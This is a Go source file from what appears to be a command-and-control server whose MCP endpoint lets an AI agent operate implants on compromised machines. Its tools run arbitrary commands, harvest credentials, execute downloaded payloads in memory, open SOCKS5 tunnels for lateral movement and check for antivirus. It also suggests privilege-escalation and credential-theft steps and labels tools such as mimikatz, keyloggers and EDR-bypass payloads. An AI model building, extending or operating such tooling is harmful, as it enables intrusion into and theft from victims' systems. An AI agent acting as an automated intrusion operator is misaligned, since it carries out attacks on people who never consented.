package api

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"time"

	"toshell/internal/common/types"
	"toshell/internal/server/intel"
	"toshell/internal/server/logging"
	"toshell/internal/server/plugin"
	"toshell/internal/server/task"
)

// ─── AI 副驾驶：MCP 工具端点 ────────────────────────────────────────
// 暴露会话上下文 / 情报查询 / 任务下发等工具，供 LLM 或外部 MCP 客户端调用。
// 简化实现：GET /api/v1/mcp/tools 返回工具清单；POST /api/v1/mcp/tools/{name} 执行。

type mcpTool struct {
	Name        string   `json:"name"`
	Description string   `json:"description"`
	Parameters  []string `json:"parameters"`
}

var mcpToolList = []mcpTool{
	{
		Name:        "intel_query",
		Description: "查询跨会话情报库（IP/账号/哈希/共享/域名）。参数: kind=ip|account|hash_ntlm|share|domain|all（默认 all）",
		Parameters:  []string{"kind"},
	},
	{
		Name:        "session_context",
		Description: "获取指定会话的上下文摘要（OS/权限/监听器/最近任务）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "task_submit",
		Description: "向会话下发命令任务。参数: session_id, command",
		Parameters:  []string{"session_id", "command"},
	},
	{
		Name:        "task_result",
		Description: "查询单个任务的状态与输出（立即返回当前状态，不等待）。参数: task_id",
		Parameters:  []string{"task_id"},
	},
	{
		Name:        "task_wait",
		Description: "轮询等待任务完成（下发后调用），返回最终输出/退出码。参数: task_id, timeout_sec",
		Parameters:  []string{"task_id", "timeout_sec"},
	},
	{
		Name:        "file_list",
		Description: "列出会话上的目录内容（结果通过 task_wait 获取）。参数: session_id, path",
		Parameters:  []string{"session_id", "path"},
	},
	{
		Name:        "file_download",
		Description: "从会话下载文件到服务器（结果含 transfer_id，通过 task_wait 获取）。参数: session_id, path",
		Parameters:  []string{"session_id", "path"},
	},
	{
		Name:        "process_list",
		Description: "列出会话上的进程（结果通过 task_wait 获取）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "process_kill",
		Description: "结束会话上的进程。参数: session_id, pid",
		Parameters:  []string{"session_id", "pid"},
	},
	{
		Name:        "screenshot",
		Description: "对会话截屏（结果通过 task_wait 获取，含 base64 图片数据）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "credentials",
		Description: "收集会话上的凭据（浏览器/系统凭据，结果通过 task_wait 获取）。参数: session_id, action",
		Parameters:  []string{"session_id", "action"},
	},
	{
		Name:        "session_kill",
		Description: "终止会话（植入端退出）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "delegate",
		Description: "子代理：在指定会话执行剧本（确定性多步链路），支持多会话并行。参数: playbook_id, session_id 或 session_ids(逗号分隔)",
		Parameters:  []string{"playbook_id", "session_id", "session_ids"},
	},
	{
		Name:        "playbook_status",
		Description: "查询剧本运行进度（delegate 返回 run_id 后用）。参数: run_id",
		Parameters:  []string{"run_id"},
	},
	{
		Name:        "session_list",
		Description: "列出所有活跃会话（ID/主机名/OS/监听器/状态）",
		Parameters:  []string{},
	},
	{
		Name:        "attack_suggest",
		Description: "基于会话上下文给出下一步操作建议（按 OS 返回可用的提权/注入/凭据选项）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "plugin_list",
		Description: "列出已上传的插件（ID/名称/类型 exe/dll/shellcode/bof）。无参数",
		Parameters:  []string{},
	},
	{
		Name:        "plugin_load",
		Description: "把插件加载到指定会话执行。参数: session_id, plugin_id, args(可选，传给插件的参数)",
		Parameters:  []string{"session_id", "plugin_id", "args"},
	},
	{
		Name:        "tunnel_start",
		Description: "为指定会话启动 SOCKS5 隧道代理（本地端口转发，可代理横向访问内网）。参数: session_id, local_port(可选，默认1080)",
		Parameters:  []string{"session_id", "local_port"},
	},
	{
		Name:        "tunnel_list",
		Description: "列出当前所有隧道代理（会话 ID / 本地端口 / 隧道数）。无参数",
		Parameters:  []string{},
	},
	{
		Name:        "tunnel_stop",
		Description: "停止指定会话的隧道代理。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "web_search",
		Description: "联网搜索：查询情报/工具/漏洞/用法。参数: query",
		Parameters:  []string{"query"},
	},
	{
		Name:        "remote_download",
		Description: "从 URL 下载工具到服务端本地 data/tools/ 持久保存（可重复使用）。参数: url",
		Parameters:  []string{"url"},
	},
	{
		Name:        "tool_list",
		Description: "列出服务端 data/tools/ 已下载的可复用工具（名称/大小/路径）",
		Parameters:  []string{},
	},
	{
		Name:        "plugin_upload",
		Description: "把 data/tools/ 下的工具上传为插件（BOF/DLL/EXE/shellcode），之后可用 plugin_load 加载到会话。参数: source, name(可选), description(可选)",
		Parameters:  []string{"source", "name", "description"},
	},
	{
		Name:        "fileless_exec",
		Description: "把 data/tools/ 下的工具按 kind(bof/shellcode/dll/exe) 内存加载执行（不落盘）。参数: session_id, source, kind(可选), args(可选)",
		Parameters:  []string{"session_id", "source", "kind", "args"},
	},
	{
		Name:        "run_command",
		Description: "向会话下发任意命令并返回待轮询任务（task_wait 取结果）。参数: session_id, command",
		Parameters:  []string{"session_id", "command"},
	},
	{
		Name:        "user_info",
		Description: "获取会话当前用户/权限/本机用户（whoami+whoami /priv+net user）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "system_info",
		Description: "获取会话系统信息（systeminfo）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "service_list",
		Description: "枚举会话上的 Windows 服务（sc queryex）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "check_av",
		Description: "检测会话上的杀软/EDR 相关进程（tasklist /v）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "net_info",
		Description: "获取会话网络配置（ipconfig /all）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "net_connections",
		Description: "列出会话上的网络连接（netstat -ano）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "env_vars",
		Description: "获取会话环境变量（set）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
	{
		Name:        "scheduled_tasks",
		Description: "列出会话上的计划任务（schtasks /query）。参数: session_id",
		Parameters:  []string{"session_id"},
	},
}

// mcpToolsHandler 返回工具清单。
func (s *Server) mcpToolsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"tools":  mcpToolList,
		"count":  len(mcpToolList),
		"notice": "AI 副驾驶工具端点：POST /api/v1/mcp/tools/{name} 调用",
	})
}

// mcpToolInvokeHandler 执行指定工具。
func (s *Server) mcpToolInvokeHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	name := strings.TrimPrefix(r.URL.Path, "/api/v1/mcp/tools/")

	var params map[string]string
	if r.Body != nil {
		_ = json.NewDecoder(r.Body).Decode(&params)
	}
	if params == nil {
		params = map[string]string{}
	}

	result, err := s.invokeTool(name, params)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
		return
	}
	json.NewEncoder(w).Encode(result)
}

// invokeTool 执行一个 MCP 工具（AI 副驾驶与 MCP 端点共用）。
func (s *Server) invokeTool(name string, params map[string]string) (interface{}, error) {
	switch name {
	case "intel_query":
		kind := params["kind"]
		store := intel.Get()
		if kind != "" && kind != "all" {
			return map[string]interface{}{"items": store.ListByKind(kind)}, nil
		}
		return map[string]interface{}{"items": store.List()}, nil
	case "session_list":
		sessions := s.sessionMgr.List()
		type sessBrief struct {
			ID       string `json:"id"`
			Hostname string `json:"hostname"`
			OS       string `json:"os"`
			Listener string `json:"listener"`
			Status   string `json:"status"`
		}
		out := make([]sessBrief, 0, len(sessions))
		for _, sess := range sessions {
			if sess == nil || sess.Info == nil {
				continue
			}
			out = append(out, sessBrief{
				ID: sess.Info.ID, Hostname: sess.Info.Hostname, OS: sess.Info.OS,
				Listener: sess.Info.Listener, Status: sess.Info.Status,
			})
		}
		return map[string]interface{}{"sessions": out, "count": len(out)}, nil
	case "session_context":
		sid := params["session_id"]
		sess, err := s.sessionMgr.Get(sid)
		if err != nil || sess == nil || sess.Info == nil {
			return nil, fmt.Errorf("session not found: %s", sid)
		}
		info := sess.Info
		tasks := s.taskMgr.ListBySession(sid)
		sort.Slice(tasks, func(i, j int) bool { return tasks[i].CreatedAt.After(tasks[j].CreatedAt) })
		recent := []map[string]interface{}{}
		for i, t := range tasks {
			if i >= 5 {
				break
			}
			recent = append(recent, map[string]interface{}{
				"task_type": t.TaskType, "command": t.Command,
				"status": t.Status, "output": truncateStr(t.Output, 200),
			})
		}
		return map[string]interface{}{
			"session_id": info.ID, "hostname": info.Hostname, "os": info.OS,
			"arch": info.Arch, "username": info.Username, "listener": info.Listener,
			"status": info.Status, "recent_tasks": recent,
		}, nil
	case "task_submit":
		sid := params["session_id"]
		cmd := params["command"]
		if sid == "" || cmd == "" {
			return nil, fmt.Errorf("session_id and command required")
		}
		task, err := s.taskMgr.CreateCommand(sid, cmd, nil, 60)
		if err != nil {
			return nil, err
		}
		if err := s.listener.PushTask(sid, task); err != nil {
			logging.Warn("api", "MCP task_submit push failed: %v", err)
			// 推送失败不致命：任务已创建，心跳轮询会取走
		}
		return map[string]interface{}{"task_id": task.ID, "status": "pushed"}, nil
	case "task_result":
		tid, err := strconv.ParseUint(params["task_id"], 10, 64)
		if err != nil || tid == 0 {
			return nil, fmt.Errorf("invalid task_id")
		}
		t, err := s.taskMgr.Get(tid)
		if err != nil || t == nil {
			return nil, fmt.Errorf("task not found: %d", tid)
		}
		return map[string]interface{}{
			"task_id": t.ID, "task_type": t.TaskType, "command": t.Command,
			"session_id": t.SessionID, "status": t.Status,
			"output": truncateStr(t.Output, 4000), "error": t.Error,
			"exit_code": t.ExitCode,
			"created_at": t.CreatedAt, "completed_at": t.CompletedAt,
		}, nil
	case "task_wait":
		tid, err := strconv.ParseUint(params["task_id"], 10, 64)
		if err != nil || tid == 0 {
			return nil, fmt.Errorf("invalid task_id")
		}
		timeout := 60 * time.Second
		if sec, perr := strconv.Atoi(params["timeout_sec"]); perr == nil && sec > 0 && sec <= 300 {
			timeout = time.Duration(sec) * time.Second
		}
		// 轮询等待任务进入终态（completed/failed/timeout）
		deadline := time.Now().Add(timeout)
		for time.Now().Before(deadline) {
			t, gerr := s.taskMgr.Get(tid)
			if gerr == nil && t != nil {
				if t.Status == "completed" || t.Status == "failed" || t.Status == "timeout" {
					return map[string]interface{}{
						"task_id": t.ID, "task_type": t.TaskType, "command": t.Command,
						"session_id": t.SessionID, "status": t.Status,
						"output": truncateStr(t.Output, 4000), "error": t.Error,
						"exit_code": t.ExitCode, "completed_at": t.CompletedAt,
					}, nil
				}
			}
			time.Sleep(500 * time.Millisecond)
		}
		t, _ := s.taskMgr.Get(tid)
		if t == nil {
			return nil, fmt.Errorf("task not found: %d", tid)
		}
		return map[string]interface{}{
			"task_id": t.ID, "task_type": t.TaskType, "command": t.Command,
			"session_id": t.SessionID, "status": t.Status,
			"output": truncateStr(t.Output, 4000), "error": t.Error,
			"exit_code": t.ExitCode, "timeout": true,
			"message": "等待超时，任务仍在执行",
		}, nil
	case "file_list":
		sid := params["session_id"]
		path := params["path"]
		if sid == "" || path == "" {
			return nil, fmt.Errorf("session_id and path required")
		}
		task, err := s.taskMgr.CreateFileList(sid, path)
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "file_download":
		sid := params["session_id"]
		path := params["path"]
		if sid == "" || path == "" {
			return nil, fmt.Errorf("session_id and path required")
		}
		task, err := s.taskMgr.CreateFileDownload(sid, path)
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "process_list":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		task, err := s.taskMgr.CreateProcessList(sid)
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "process_kill":
		sid := params["session_id"]
		pid, perr := strconv.ParseUint(params["pid"], 10, 32)
		if sid == "" || perr != nil {
			return nil, fmt.Errorf("session_id and pid required")
		}
		task, err := s.taskMgr.CreateProcessKill(sid, uint32(pid))
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "screenshot":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		task, err := s.taskMgr.Create(sid, task.TaskParams{TaskType: "screenshot"})
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "credentials":
		sid := params["session_id"]
		action := params["action"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		if action == "" {
			action = "all"
		}
		credData, _ := json.Marshal(map[string]string{"action": action})
		task, err := s.taskMgr.Create(sid, task.TaskParams{TaskType: "credentials", Data: string(credData)})
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, task), nil
	case "session_kill":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		task, err := s.taskMgr.CreateExit(sid)
		if err != nil {
			return nil, err
		}
		if err := s.listener.PushTask(sid, task); err != nil {
			logging.Warn("api", "MCP session_kill push failed: %v", err)
		}
		return map[string]interface{}{"task_id": task.ID, "status": "kill sent"}, nil
	case "delegate":
		// 子代理：在指定会话执行剧本（并行能力），协调者可分发多会话。
		// 参数：playbook_id + session_id（单）或 session_ids（逗号分隔多会话并行）
		pb := params["playbook_id"]
		if pb == "" {
			return nil, fmt.Errorf("playbook_id required")
		}
		if s.playbookR == nil {
			return nil, fmt.Errorf("playbook runner not available")
		}
		sid := params["session_id"]
		many := params["session_ids"]
		if many != "" {
			ids := strings.Split(many, ",")
			runs := s.playbookR.RunParallel(ids, pb, 3)
			runIDs := make([]string, 0, len(runs))
			for _, run := range runs {
				runIDs = append(runIDs, run.ID)
			}
			return map[string]interface{}{
				"status": "delegated", "parallel": true,
				"playbook": pb, "run_ids": runIDs, "count": len(runIDs),
			}, nil
		}
		if sid == "" {
			return nil, fmt.Errorf("session_id or session_ids required")
		}
		run, err := s.playbookR.Run(pb, sid)
		if err != nil {
			return nil, err
		}
		return map[string]interface{}{
			"status": "delegated", "run_id": run.ID, "playbook": pb, "session_id": sid,
		}, nil
	case "playbook_status":
		// 查询剧本运行进度：参数 run_id
		rid := params["run_id"]
		if rid == "" {
			return nil, fmt.Errorf("run_id required")
		}
		if s.playbookR == nil {
			return nil, fmt.Errorf("playbook runner not available")
		}
		if run := s.playbookR.GetRun(rid); run != nil {
			return run, nil
		}
		return nil, fmt.Errorf("run not found: %s", rid)
	case "attack_suggest":
		sid := params["session_id"]
		sess, err := s.sessionMgr.Get(sid)
		if err != nil || sess == nil || sess.Info == nil {
			return nil, fmt.Errorf("session not found: %s", sid)
		}
		osName := strings.ToLower(sess.Info.OS)
		suggestions := []map[string]string{}
		if strings.Contains(osName, "windows") {
			suggestions = append(suggestions,
				map[string]string{"action": "av_detect", "desc": "检测目标杀软，评估免杀需求"},
				map[string]string{"action": "process_list", "desc": "枚举进程，识别 EDR/分析工具"},
				map[string]string{"action": "credentials", "desc": "尝试收集凭据（需提权后更有效）"},
				map[string]string{"action": "privesc_uac", "desc": "UAC 提权（普通权限会话）"},
			)
		} else {
			suggestions = append(suggestions,
				map[string]string{"action": "process_list", "desc": "枚举进程了解目标环境"},
				map[string]string{"action": "file_list", "desc": "查看敏感目录（/etc/shadow /root）"},
				map[string]string{"action": "sysinfo", "desc": "系统信息收集"},
			)
		}
		return map[string]interface{}{
			"session_id": sid, "os": sess.Info.OS, "suggestions": suggestions,
		}, nil
	case "plugin_list":
		mgr := plugin.GetManager()
		if mgr == nil {
			return nil, fmt.Errorf("Plugin manager not initialized")
		}
		return map[string]interface{}{"plugins": mgr.List(), "count": len(mgr.List())}, nil
	case "plugin_load":
		sid := params["session_id"]
		pid := params["plugin_id"]
		if sid == "" || pid == "" {
			return nil, fmt.Errorf("session_id and plugin_id required")
		}
		res, err := s.loadPlugin(sid, pid, params["args"])
		if err != nil {
			return nil, err
		}
		res["hint"] = "用 task_wait 工具等待任务完成并获取结果"
		return res, nil
	case "tunnel_start":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		port, _ := strconv.Atoi(params["local_port"])
		p, err := s.startSOCKS5(sid, port)
		if err != nil {
			return nil, err
		}
		return map[string]interface{}{"session_id": sid, "local_port": p, "status": "running"}, nil
	case "tunnel_list":
		s.socks5Mu.RLock()
		slist := []map[string]interface{}{}
		for sid, socks5 := range s.socks5Servers {
			slist = append(slist, map[string]interface{}{
				"session_id": sid,
				"local_port": socks5.GetPort(),
				"tunnels":    len(socks5.GetTunnelManager().ListTunnels()),
			})
		}
		s.socks5Mu.RUnlock()
		return map[string]interface{}{"servers": slist, "count": len(slist)}, nil
	case "tunnel_stop":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		s.stopSOCKS5(sid)
		return map[string]interface{}{"session_id": sid, "status": "stopped"}, nil
	case "web_search":
		return webSearch(params["query"])
	case "remote_download":
		return remoteToolDownload(params["url"])
	case "tool_list":
		return listServerTools(), nil
	case "plugin_upload":
		src := params["source"]
		if src == "" {
			return nil, fmt.Errorf("source (file in data/tools) required")
		}
		name := params["name"]
		if name == "" {
			name = src
		}
		toolPath := filepath.Join("data", "tools", src)
		data, rerr := os.ReadFile(toolPath)
		if rerr != nil {
			return nil, fmt.Errorf("read tool failed: %w", rerr)
		}
		p, perr := plugin.GetManager().Add(name, data, params["description"])
		if perr != nil {
			return nil, perr
		}
		return map[string]interface{}{
			"id": p.ID, "name": p.Name, "type": p.Type, "size": len(data),
			"message": "已上传到插件库，可用 plugin_load 加载到会话执行",
		}, nil
	case "fileless_exec":
		sid := params["session_id"]
		src := params["source"]
		if sid == "" || src == "" {
			return nil, fmt.Errorf("session_id and source (file in data/tools) required")
		}
		kind := params["kind"]
		if kind == "" {
			kind = guessToolKind(src)
		}
		toolPath := filepath.Join("data", "tools", src)
		data, rerr := os.ReadFile(toolPath)
		if rerr != nil {
			return nil, fmt.Errorf("read tool failed: %w", rerr)
		}
		taskInfo, cerr := s.taskMgr.CreateFilelessExec(sid, kind, base64.StdEncoding.EncodeToString(data), params["args"], "")
		if cerr != nil {
			return nil, cerr
		}
		return map[string]interface{}{
			"task_id": taskInfo.ID, "kind": kind, "source": src, "size": len(data),
			"hint":     "用 task_wait 等内存加载任务完成并获取结果",
		}, nil
	case "run_command", "user_info", "system_info", "service_list",
		"check_av", "net_info", "net_connections", "env_vars", "scheduled_tasks":
		sid := params["session_id"]
		if sid == "" {
			return nil, fmt.Errorf("session_id required")
		}
		cmd := builtinCommand(name, params["command"])
		if cmd == "" {
			return nil, fmt.Errorf("empty command for %s", name)
		}
		taskInfo, err := s.taskMgr.CreateCommand(sid, cmd, nil, 60)
		if err != nil {
			return nil, err
		}
		return s.mcpPushResult(sid, taskInfo), nil
	default:
		return nil, fmt.Errorf("unknown tool: %s", name)
	}
}

// webSearch 联网搜索（DuckDuckGo Instant Answer；服务端侧请求，供 AI 情报/工具检索）。
func webSearch(q string) (interface{}, error) {
	q = strings.TrimSpace(q)
	if q == "" {
		return nil, fmt.Errorf("query required")
	}
	uq := url.QueryEscape(q)
	client := &http.Client{Timeout: 25 * time.Second}
	resp, err := client.Get("https://api.duckduckgo.com/?q=" + uq + "&format=json&no_html=1&skip_disambig=1")
	if err != nil {
		return nil, fmt.Errorf("web search failed: %w", err)
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 2<<20))
	var m map[string]interface{}
	json.Unmarshal(body, &m)

	items := []map[string]string{}
	if abs, ok := m["AbstractText"].(string); ok && abs != "" {
		u, _ := m["AbstractURL"].(string)
		items = append(items, map[string]string{"title": "摘要", "snippet": truncateStr(abs, 600), "url": u})
	}
	if rel, ok := m["RelatedTopics"].([]interface{}); ok {
		for _, r := range rel {
			rm, ok := r.(map[string]interface{})
			if !ok {
				continue
			}
			if text, ok := rm["Text"].(string); ok && text != "" {
				items = append(items, map[string]string{"title": "相关", "snippet": truncateStr(text, 300)})
			}
			if len(items) >= 20 {
				break
			}
		}
	}
	return map[string]interface{}{"query": q, "results": items, "count": len(items)}, nil
}

// remoteToolDownload 从 URL 下载工具到服务端本地 data/tools/ 持久保存（可重复使用）。
func remoteToolDownload(rawURL string) (map[string]interface{}, error) {
	if !strings.HasPrefix(rawURL, "http://") && !strings.HasPrefix(rawURL, "https://") {
		return nil, fmt.Errorf("url must be http(s)://")
	}
	client := &http.Client{Timeout: 120 * time.Second}
	resp, err := client.Get(rawURL)
	if err != nil {
		return nil, fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("download status %d", resp.StatusCode)
	}
	// 限 256MB，防误下超大文件（下载超时 120s，见上方 client）
	limited := io.LimitReader(resp.Body, 256<<20)

	name := pathBase(filepath.Base(uPath(rawURL)))
	if name == "" || name == "." || name == "/" {
		name = fmt.Sprintf("tool-%d", time.Now().Unix())
	}
	dir := filepath.Join("data", "tools")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return nil, err
	}
	dst := filepath.Join(dir, name)
	f, err := os.Create(dst)
	if err != nil {
		return nil, err
	}
	n, err := io.Copy(f, limited)
	f.Close()
	if err != nil {
		os.Remove(dst)
		return nil, fmt.Errorf("save failed: %w", err)
	}
	// sha256
	h := sha256.Sum256(mustReadFile(dst))
	return map[string]interface{}{
		"path":   dst,
		"name":   name,
		"size":   n,
		"sha256": hex.EncodeToString(h[:]),
		"message": "已下载到服务端 data/tools/，可重复使用（上传/推送会话、加载插件、执行）",
	}, nil
}

func uPath(s string) string {
	if u, err := url.Parse(s); err == nil {
		return u.Path
	}
	return s
}

func pathBase(p string) string {
	p = strings.ReplaceAll(p, "\\", "/")
	if i := strings.LastIndex(p, "/"); i >= 0 {
		return p[i+1:]
	}
	return p
}

func mustReadFile(p string) []byte {
	b, _ := os.ReadFile(p)
	return b
}

// listServerTools 列出服务端 data/tools/ 已下载的可复用工具，附带用途/平台/校验（供 AI 精准决策）。
func listServerTools() interface{} {
	dir := filepath.Join("data", "tools")
	items := []map[string]interface{}{}
	entries, err := os.ReadDir(dir)
	if err != nil {
		return map[string]interface{}{"dir": dir, "tools": items, "count": 0}
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		p := filepath.Join(dir, e.Name())
		info, _ := e.Info()
		sum := sha256.Sum256(mustReadFile(p))
		items = append(items, map[string]interface{}{
			"name":     e.Name(),
			"size":     info.Size(),
			"path":     p,
			"sha256":   hex.EncodeToString(sum[:]),
			"kind":     guessToolKind(e.Name()),       // bof/shellcode/dll/exe
			"platform": guessToolPlatform(e.Name()),   // windows / linux / macos / 通用
			"arch":     guessToolArch(e.Name()),       // amd64 / 386 / arm64 / 通用
			"usage":    guessToolUsage(e.Name()),      // 用途（凭据收集/载荷/插件等）
		})
	}
	return map[string]interface{}{"dir": dir, "tools": items, "count": len(items)}
}

// guessToolPlatform 按扩展名/名字推断目标平台。
func guessToolPlatform(name string) string {
	ext := strings.ToLower(filepath.Ext(name))
	switch ext {
	case ".exe", ".dll", ".o", ".obj", ".sys", ".bof":
		return "windows"
	case ".elf", ".so":
		return "linux"
	case ".macho", ".dylib":
		return "macos"
	case ".bin", ".raw":
		return "shellcode(通用)"
	default:
		return "通用"
	}
}

// guessToolArch 按文件名字面推断架构（x64/64→amd64，x86/32→386，arm→arm64）。
func guessToolArch(name string) string {
	n := strings.ToLower(name)
	switch {
	case strings.Contains(n, "arm64"), strings.Contains(n, "aarch64"):
		return "arm64"
	case strings.Contains(n, "arm"):
		return "arm"
	case strings.Contains(n, "x64"), strings.Contains(n, "-64"), strings.Contains(n, "64bit"):
		return "amd64"
	case strings.Contains(n, "x86"), strings.Contains(n, "-32"), strings.Contains(n, "32bit"):
		return "386"
	default:
		return "通用"
	}
}

// guessToolUsage 按文件名/扩展名推断用途（供 AI 决策插件 vs 内存加载）。
func guessToolUsage(name string) string {
	n := strings.ToLower(name)
	switch {
	case strings.Contains(n, "mimikatz"), strings.Contains(n, "sekurlsa"):
		return "凭据收集"
	case strings.Contains(n, "procdump"), strings.Contains(n, "dumpert"):
		return "进程内存转储"
	case strings.Contains(n, "winpeas"), strings.Contains(n, "linpeas"):
		return "特权提升检查"
	case strings.Contains(n, "seatbelt"), strings.Contains(n, "sharp"):
		return "主机枚举"
	case strings.Contains(n, "kekeo"), strings.Contains(n, "rubeus"):
		return "Kerberos 票据"
	case strings.Contains(n, "psexec"), strings.Contains(n, "wmiexec"):
		return "横向执行"
	case strings.Contains(n, "beacon"), strings.Contains(n, "shellcode"), strings.Contains(n, "loader"):
		return "载荷/内存加载"
	case strings.Contains(n, "keylogger"), strings.Contains(n, "clip"):
		return "键盘记录"
	case strings.Contains(n, "edr"), strings.Contains(n, "bypass"), strings.Contains(n, "av"):
		return "绕杀软/EDR"
	}
	switch strings.ToLower(filepath.Ext(name)) {
	case ".dll":
		return "DLL(插件/反射加载)"
	case ".exe":
		return "可执行工具"
	case ".bin", ".raw":
		return "shellcode(内存加载)"
	case ".o", ".obj":
		return "BOF 插件"
	case ".so":
		return "Linux 共享库"
	}
	return "通用工具"
}

// guessToolKind 按扩展名推测内存加载类型（供 fileless_exec 缺省 kind）。
func guessToolKind(src string) string {
	ext := strings.ToLower(filepath.Ext(src))
	switch ext {
	case ".o", ".obj", ".bof":
		return "bof"
	case ".dll":
		return "dll"
	case ".exe":
		return "exe"
	default:
		return "shellcode" // .bin/.raw/无后缀按 shellcode
	}
}

// builtinCommand 高层命令工具 → 预制命令字符串。
func builtinCommand(name, raw string) string {
	switch name {
	case "run_command":
		return raw
	case "user_info":
		return "whoami && whoami /priv && net user"
	case "system_info":
		return "systeminfo"
	case "service_list":
		return "sc queryex type= service state= all"
	case "check_av":
		return "tasklist /v /fo csv"
	case "net_info":
		return "ipconfig /all"
	case "net_connections":
		return "netstat -ano"
	case "env_vars":
		return "set"
	case "scheduled_tasks":
		return "schtasks /query /fo csv /v"
	default:
		return raw
	}
}

// mcpPushResult 创建任务后推送，返回标准响应（task_id 供 agent 用 task_wait 取结果）。
// 推送失败不致命：任务已入队，心跳轮询/重连补发会派发。
func (s *Server) mcpPushResult(sid string, taskInfo *types.TaskInfo) map[string]interface{} {
	if s.listener != nil {
		if err := s.listener.PushTask(sid, taskInfo); err != nil {
			logging.Warn("api", "MCP task push to %s failed: %v", sid, err)
		}
	}
	return map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"status":    "pushed",
		"hint":      "用 task_wait 工具等待任务完成并获取结果",
	}
}
